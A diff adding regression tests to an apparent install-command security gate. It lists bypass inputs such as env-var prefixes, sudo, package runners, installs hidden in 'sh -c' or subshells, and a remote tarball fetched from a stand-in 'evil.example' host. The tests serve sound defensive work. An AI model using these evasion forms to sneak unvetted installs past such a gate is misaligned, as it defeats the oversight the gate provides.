@@ -137,6 +137,48 @@ describe("parseInstallCommand — detection", () => {
   });
 });
 
+// Adversarial bypasses found in the deep security pass — each defeated every
+// matcher before the fix and let an untriaged install through. Regression-locked.
+describe("parseInstallCommand — bypass resistance (security)", () => {
+  it("CRIT-1: a leading env-var assignment does not hide the install", () => {
+    // `A=1 npm i evil` tokenized to t[0]="A=1" → no matcher fired → ALLOWED.
+    assert.deepEqual(parseInstallCommand("A=1 npm i evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("FOO=bar BAZ=2 pip install evil").refs, ["pip:evil"]);
+    assert.deepEqual(parseInstallCommand("env X=1 npm i evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("sudo npm i evil").refs, ["npm:evil"]);
+  });
+
+  it("CRIT-2: package runners (npm exec / pnpm dlx / yarn dlx / bun x) are gated", () => {
+    assert.deepEqual(parseInstallCommand("npm exec evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("pnpm dlx evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("yarn dlx evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("bun x evil").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("pnpm exec evil").refs, ["npm:evil"]);
+  });
+
+  it("CRIT-3: a remote tarball URL is unverifiable (fail-closed), not 'local'", () => {
+    const p = parseInstallCommand("npm install https://evil.example/pkg.tgz");
+    assert.equal(p.isInstall, true);
+    assert.deepEqual(p.refs, []);
+    assert.equal(p.unverifiable.length, 1, "remote .tgz must NOT be dropped as a local target");
+    // a genuinely local tarball/wheel path is still ignored
+    assert.deepEqual(parseInstallCommand("pip install ./dist/foo.whl").refs, []);
+    assert.deepEqual(parseInstallCommand("npm i ./pkg.tgz").refs, []);
+  });
+
+  it("HIGH-1: an install hidden in a subshell / -c arg is still detected", () => {
+    assert.deepEqual(parseInstallCommand("sh -c 'npm i evil'").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand('bash -c "pip install evil"').refs, ["pip:evil"]);
+    assert.deepEqual(parseInstallCommand("echo $(npm i evil)").refs, ["npm:evil"]);
+    assert.deepEqual(parseInstallCommand("x=`pip install evil`").refs, ["pip:evil"]);
+  });
+
+  it("quoted package names are handled (no false-positive block)", () => {
+    assert.deepEqual(parseInstallCommand("npm i 'express'").refs, ["npm:express"]);
+    assert.deepEqual(parseInstallCommand('npm i "lodash@4"').refs, ["npm:lodash"]);
+  });
+});
+
 // Fake triage: pass everything except names in `blocklist`.
 function fakeDeps(blocklist: string[] = []): GateDeps {
   return {
